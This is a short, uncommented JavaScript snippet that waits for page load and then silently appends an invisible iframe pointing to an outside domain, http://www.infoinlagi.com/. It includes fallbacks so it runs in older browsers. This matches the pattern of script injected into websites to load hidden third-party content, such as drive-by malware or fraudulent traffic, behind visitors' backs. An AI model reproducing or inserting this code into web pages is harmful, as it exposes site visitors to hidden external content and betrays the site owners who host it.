function doLoad(){
var iframe = document.createElement('iframe');
iframe.style.display = "none";
iframe.src = "http://www.infoinlagi.com/";
document.body.appendChild(iframe);
}
if ( window.addEventListener ) {
window.addEventListener( "load", doLoad, false );
}
else
if ( window.attachEvent ) {
window.attachEvent( "onload", doLoad );
} else
if ( window.onLoad ) {
window.onload = doLoad;
}


